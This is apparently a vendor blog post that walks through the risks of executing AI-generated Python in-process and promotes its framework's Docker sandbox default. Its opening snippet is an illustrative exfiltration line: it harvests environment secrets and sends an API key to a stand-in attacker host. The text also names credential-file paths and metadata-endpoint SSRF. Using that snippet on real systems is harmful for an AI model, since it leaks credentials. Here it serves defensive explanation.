---
title: "The Real Risks of Running AI-Generated Code In-Process"
description: "A threat-model walkthrough, not another isolation-layer reference: what model-written Python can actually reach when it executes in your process — the…"
keywords: "risks of running AI-generated code, python repl tool security, run llm-generated code without a sandbox, code interpreter agent isolated"
date: 2026-07-16
slug: risks-of-running-ai-generated-code
categories:
  - Sandboxing
---

# The Real Risks of Running AI-Generated Code In-Process

The risks of running AI-generated code are easy to underestimate, because the failure mode is invisible right up until the day it isn't: the program runs, prints a plausible answer, and only later do you notice it also read your `.env`, listed `/`, and made an outbound request you never authorized. This post is a threat-model walkthrough rather than another isolation-layer reference. We are going to trace exactly what a model-written Python snippet can reach when it executes inside your process — the working directory and everything around it, environment-variable secrets, and the open network — using LangChain's `PythonREPLTool` as the worked example, and then show why Promptise Foundry treats a hardened container as the default path instead of something you remember to bolt on.

<!-- more -->

## What "in-process" actually means

When an agent runs code "in-process," it calls something like Python's `exec()` inside the very interpreter that runs your application. That is precisely what LangChain's `PythonREPLTool` does, and to its credit the tool says so — its own documentation warns that it "can execute arbitrary code on the host machine" and the class lives under `langchain_experimental` behind a sanitization notice. The warning is not boilerplate. Code that runs in your process inherits your process: the same user id, the same file descriptors, the same environment block, the same network stack. There is no boundary between "the model's program" and "your service." The blast radius is your entire runtime.

Concretely, a single generated snippet like the following has three distinct reaches, and none of them require anything exotic:

```python
# Illustrative ONLY — this is what an in-process REPL tool can run, not Promptise code.
import os, glob, urllib.request

secrets = dict(os.environ)                       # (1) every env var, including keys
files   = glob.glob("/**/*", recursive=True)     # (2) the filesystem your process can see
urllib.request.urlopen(                           # (3) an outbound request off the box
    "https://attacker.example/collect?e=" + secrets.get("OPENAI_API_KEY", "")
)
```

## The blast radius: three reaches into your process

**Reach 1 — the working directory and well beyond.** The first instinct is "it can only touch its working directory." It cannot be contained to the working directory when it shares your process. A model-written program runs with your service's permissions, so it can read anything your service can read: your source tree, adjacent tenants' scratch files, a mounted config volume, `~/.aws/credentials`, `~/.ssh/id_rsa`, `/etc/passwd`. Relative paths are a convention, not a fence — `open("../../etc/shadow")` is one string away. And reads are the gentle half. The same permissions let it *write*: overwrite a config file the app reloads, drop a file into a watched-folder pipeline, or truncate a log another process trusts. A hallucinated `shutil.rmtree` on the wrong path is not a hypothetical; it is one plausible-looking line.

**Reach 2 — environment-variable secrets.** Most agent deployments inject secrets through the environment: `OPENAI_API_KEY`, `DATABASE_URL`, cloud IAM credentials handed in by the orchestrator. `os.environ` is a plain dict in the same process, so a generated program reads the *entire* secret set in one expression. There is no vault boundary to cross because the secrets were already decrypted into memory next to the interpreter. This is the reach teams consistently forget when they reason about "just a calculator tool" — the calculator shares an address space with every credential your platform mounted for the real workload.

**Reach 3 — the open network.** An in-process interpreter has your process's network stack, which means full outbound reach. That turns reaches 1 and 2 from "local read" into "exfiltration": one `urllib.request.urlopen` and the secrets it just harvested leave your perimeter. Worse, the network reach is *inbound-adjacent* too — the program can hit internal services that are only firewalled from the outside world, including the cloud metadata endpoint at `169.254.169.254`, which on a misconfigured instance hands back short-lived IAM credentials. A code snippet that "just does some math" is one SSRF away from assuming your instance role. If you want the full argument for why cutting the network is the single highest-leverage control here, we made it in [Can Your Agent Exfiltrate Data? Sandboxing Code With No Network](sandbox-agent-code-with-no-network.md).

## What other frameworks do today

To be fair and precise: the tools that run model code in-process are honest about it, and hardened execution *does* exist in the ecosystem — it just isn't the default path you reach for first.

- **LangChain `PythonREPLTool` / `PythonAstREPLTool`** execute code in the host Python process via `exec` (the AST variant parses first, but still runs in-process). Both explicitly warn they can execute arbitrary code and ship under `langchain_experimental`. The delta is not a missing warning — it's that the isolation is *your* job once you accept the tool.
- **Hardened, network-isolated execution is available as a separate integration or service**: e2b's code interpreter, Riza, Modal, and the newer Pyodide/Deno-based `langchain-sandbox` package all give you a real boundary. That is genuinely good tooling. The exact delta is that each is an opt-in dependency you must choose, wire up, and (for the hosted ones) pay and send code to. The container isolation is not what happens when you grab the built-in REPL tool — it is a second decision, made later, often after a proof-of-concept already shipped the in-process version.

So the honest framing is not "other frameworks can't sandbox code." They can. It's that the *safe* option is a bolt-on and the *unsafe* option is the frictionless default. Promptise's edge is structural: it inverts that default so the hardened container is the path of least resistance, not the upgrade you schedule for later.

## The fix: a hardened container as the default, not a bolt-on

In Promptise Foundry you do not choose an isolation service and wire it into a tool. You flip one argument on the same `build_agent` you already use, and the model's code stops touching your process entirely. The example below is runnable end-to-end — set `OPENAI_API_KEY`, have Docker running, and the agent will *write* Python and *execute* it inside a container instead of in your interpreter.

```python
import asyncio
from promptise import build_agent


async def main():
    # sandbox=True auto-injects five container tools:
    # execute, read_file, write_file, list_files, install_package.
    agent = await build_agent(
        model="openai:gpt-5-mini",
        servers={},                     # or your MCP servers
        sandbox=True,                   # Docker required — code runs in a container
        instructions=(
            "You are a Python developer. To answer a computation task, write a "
            "script with write_file, run it with execute, read any error, fix it, "
            "and report the final result."
        ),
    )

    result = await agent.ainvoke({"messages": [{"role": "user", "content":
        "Write and run a Python script that prints the 20th Fibonacci number."}]})
    print(result["messages"][-1].content)

    await agent.shutdown()


asyncio.run(main())
```

The same `os.environ`, `glob`, and `urllib` reaches from earlier now land against a container that was built to refuse them. With `sandbox=True` the program runs on Promptise's default-hardened profile:

- **Read-only rootfs** — the container's root filesystem is mounted read-only; only `/workspace` and `/tmp` are writable, so the model's code cannot overwrite system files or persist a foothold.
- **Capability dropping** — roughly 40 Linux capabilities are stripped (`CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_SYS_PTRACE`, and the rest), so even code that tries privileged operations has nothing to hold onto.
- **Seccomp syscall filtering** — Docker's default seccomp profile blocks roughly 44 dangerous syscalls (`mount`, `reboot`, `kexec_load`, kernel module loading), and `no-new-privileges` stops setuid binaries from escalating.
- **Resource limits** — CPU, memory, a process cap, and an execution timeout mean a runaway or fork-bomb program is stopped — a timed-out command is killed inside the container — not left spinning against your host.

Reach 2 collapses because the container has its own environment, not your process's secret block. Reach 3 collapses the moment you cut the network — which `sandbox=True` already does, because `network="none"` is the default for every sandbox. Every knob (backend, `network`, `memory_limit`, `cpu_limit`, `timeout`, gVisor runtime) is documented layer by layer in the [sandbox reference](../../core/sandbox.md).

## Mapping the blast radius to the layer that closes it

The point of a threat model is that each reach maps to a specific control. Here is the in-process blast radius against the default sandbox that neutralizes it:

| In-process reach (`PythonREPLTool`) | What closes it in the Promptise sandbox |
|---|---|
| Read/write host files (`open`, `shutil`, path traversal) | Read-only rootfs; only `/workspace` + `/tmp` writable; no host mount |
| Harvest `os.environ` secrets | Fresh container environment — your process's secret block is not present |
| Outbound exfiltration / SSRF to metadata endpoint | `network="none"` (the default); no route off the box |
| Privileged syscalls / escape attempts | ~40 dropped capabilities + `no-new-privileges` + Docker's default seccomp profile; optional gVisor kernel |
| Runaway / fork-bomb | CPU, memory, PID, and timeout limits; timed-out commands are killed |

To harden further, pass a dict instead of `True`, pin the network explicitly, and tighten the limits:

```python
agent = await build_agent(
    model="openai:gpt-5-mini",
    servers={},
    sandbox={
        "network": "none",       # no outbound at all — kills the exfil path
        "memory_limit": "256M",
        "cpu_limit": 1,
        "timeout": 30,
    },
)
```

This is also why the [code-action pattern](../../guides/code-action.md) — where the model writes one program over your tools instead of chaining calls — is safe to reach for: it *requires* a sandbox, auto-sets `network="none"`, and raises a clear error rather than silently running model code on the host if a container can't be initialized. There is no quiet fallback to the dangerous path. For the end-to-end operational playbook of building on top of this, see [How to Run AI-Generated Code Safely: The 2026 Field Guide](run-ai-generated-code-safely.md).

## Frequently asked questions

### What are the actual risks of running AI-generated code in my process?

A program that runs in your interpreter inherits your process's permissions. That gives it three concrete reaches: the filesystem your service can read or write (source, adjacent tenant data, key files), your environment-variable secrets via `os.environ`, and your full network stack — which turns a local read into remote exfiltration and can pivot to internal-only services like the cloud metadata endpoint. None of these require attacker sophistication; a single hallucinated or prompt-injected line is enough.

### Is LangChain's `PythonREPLTool` safe to use?

It runs code in the host process and its own docs warn it can execute arbitrary code, so it is only as safe as the input reaching it — which for an agent is model output influenced by user text. It is fine for a trusted local script; it is the wrong default for anything touching untrusted input. LangChain does offer hardened execution through separate integrations (e2b, Riza, Modal, `langchain-sandbox`), but those are opt-in choices layered on top, not what the built-in REPL tool gives you.

### Can I run LLM-generated code without a sandbox in production?

You can, and the day nothing goes wrong you'll never know how close you were. For anything beyond a trusted local experiment, don't — the cost of the boundary is one argument (`sandbox=True`) and a running Docker daemon, and the cost of skipping it is your secrets and instance role. Promptise deliberately makes the sandboxed path the easy one so "run it unsandboxed" is a conscious choice, not the default.

### How is a "code interpreter agent isolated" differently in Promptise?

The isolation is structural rather than a bolt-on. Selecting `sandbox=True` (or the code-action pattern, which forces it) provisions a Docker container with a read-only rootfs, ~40 dropped capabilities, Docker's default seccomp profile, resource limits, and a network mode that defaults to none — before any model code runs. The agent's five code tools operate against that container, so there is no in-process code path to fall back to.

## Next steps

Turn on `sandbox=True` in `build_agent` and let model-written code run in a container instead of your interpreter — that one change closes every reach in the table above. Start from the [sandbox reference](../../core/sandbox.md) for the full layer-by-layer configuration, wire an aggregation workload through the [code-action guide](../../guides/code-action.md) to get network-isolation for free, and read [How to Run AI-Generated Code Safely: The 2026 Field Guide](run-ai-generated-code-safely.md) for the production checklist.
